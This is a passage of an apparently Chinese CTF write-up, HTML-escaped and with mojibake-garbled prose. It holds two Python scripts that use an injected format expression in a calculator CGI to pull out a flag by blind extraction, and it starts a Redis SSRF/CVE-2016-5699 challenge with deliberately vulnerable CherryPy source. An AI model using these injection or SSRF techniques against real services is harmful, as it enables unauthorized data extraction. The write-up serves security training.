&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">urllib&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">string&lt;/span>
&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://192.168.60.131/cgi-bin/py.py?source=&lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">&amp;amp;value1=&lt;/span>&lt;span style="color:#d88200">{1}&lt;/span>&lt;span style="color:#d88200">&amp;amp;op=&lt;/span>&lt;span style="color:#d88200">{2}&lt;/span>&lt;span style="color:#d88200">&amp;amp;value2=&lt;/span>&lt;span style="color:#d88200">{3}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">source&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">value1&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;T&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">op&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;+f&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">value2&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ru{FLAG&amp;gt;source or 14:x}&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">prev&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">255&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">printable&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">source&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">prev&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">source&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">source&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">source&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">value1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">op&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">value2&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>
&lt;span style="color:#75715e">#print(result)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#34;True&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#d88200">&amp;#34;security&amp;#34;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">+=&lt;/span>&lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">prev&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">prev&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">i&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">re&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">calc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">v1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">v2&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">op&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">u&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://206.189.223.3/cgi-bin/server.py?&amp;#34;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value1&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">v1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">value2&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">v2&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">op&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">op&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">source&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">u&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">re&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">findall&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;pre&amp;gt;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;gt;&amp;gt;&amp;gt;&amp;gt;([\s\S]*)&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;gt;&amp;gt;&amp;gt; &amp;lt;\/pre&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;Invalid&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">check&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">mid&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">mid&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">calc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">v1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">v2&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">op&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">bin_search&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">seq&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">xrange&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0x20&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0x80&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">lo&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">hi&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">None&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">lo&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">hi&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">None&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">hi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">seq&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#111">lo&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">hi&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">mid&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">lo&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">hi&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">check&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">seq&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">mid&lt;/span>&lt;span style="color:#111">]):&lt;/span> &lt;span style="color:#111">hi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">mid&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">lo&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">mid&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">seq&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">lo&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">v1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">op&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">v2&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;T&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;+f&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;ru{FLAG&amp;lt;source or 14:x}&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">bin_search&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">flag&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>åªç”¨æŠŠä¸Šé¢çš„payloadç¨å¾®é­”æ”¹ä¸€ä¸‹å°±è¡Œï¼Œvalue1=T, op=+f, value2=re{Flag&amp;lt;source or 14:x}, source=xxxxï¼Œä¼ å‚çš„æ—¶å€™ä¸ç”¨åŠ å¼•å·ï¼Œå› ä¸ºå®ƒåœ¨é¢˜ç›®ä¸­è¿ç®—çš„æ—¶å€™ä¼šè‡ªå·±åŠ ä¸Šçš„&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://xz.aliyun.com/t/2456">wp&lt;/a> | &lt;a href="https://tiaonmmn.github.io/2019/05/15/MeePwn2018-PyCalX-1-2/">wp2&lt;/a>&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[SWPUCTF 2016]Web7
&lt;/h4>
&lt;/summary>
&lt;p>robots.txtçš„æŠ¥é”™æ˜¾ç¤ºè¿™æ˜¯py2.7ï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ªç¬¬ä¸‰æ–¹åº“cherrypy17.4.2ï¼Œé¦–é¡µæ˜¯è¾“å…¥æ¡†ï¼Œè¦æ±‚è¾“å…¥ä¸€ä¸ªurlï¼Œä¹‹åŽå¯ä»¥è¿”å›žå‘å‡ºè¯·æ±‚çš„ä¿¡æ¯ï¼Œä¸‹é¢è¿˜æœ‰ä¸€ä¸ªloginè¾“å…¥å¯†ç ç™»å…¥adminï¼Œæ— å¼±å£ä»¤&lt;/p>
&lt;p>çœ‹æºç çš„æ—¶å€™ç›´æŽ¥çœ‹åˆ°dockeräº†ï¼Œè€ƒç‚¹æ˜¯cve-2016-5699å’Œredis ssrf&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/python&lt;/span>
&lt;span style="color:#75715e"># coding:utf8&lt;/span>
&lt;span style="color:#111">__author__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;niexinming&amp;#39;&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">cherrypy&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">urllib2&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">redis&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">web7&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#75af00">@cherrypy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">expose&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;script&amp;gt; window.location.href=&amp;#39;/input&amp;#39;;&amp;lt;/script&amp;gt;&amp;#34;&lt;/span>
&lt;span style="color:#75af00">@cherrypy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">expose&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">input&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">submit&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;index.html&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;r&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">reheaders&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">cherrypy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#d88200">&amp;#34;GET&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">reheaders&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">cherrypy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;url&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">submit&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">cherrypy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;submit&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">urllib2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">urlopen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">info&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">reheaders&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">reheaders&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">reheaders&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;é”™è¯¯&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">urllib2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">urlopen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">info&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">reheaders&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">reheaders&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span>
&lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;?response?&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">reheaders&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">file&lt;/span>
&lt;span style="color:#75af00">@cherrypy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">expose&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">login&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">submit&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">redis&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ConnectionPool&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">host&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">6379&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">redis&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Redis&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">connection_pool&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">pool&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">re&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;login.html&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;r&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">cherrypy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#d88200">&amp;#34;GET&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">re&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">cherrypy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
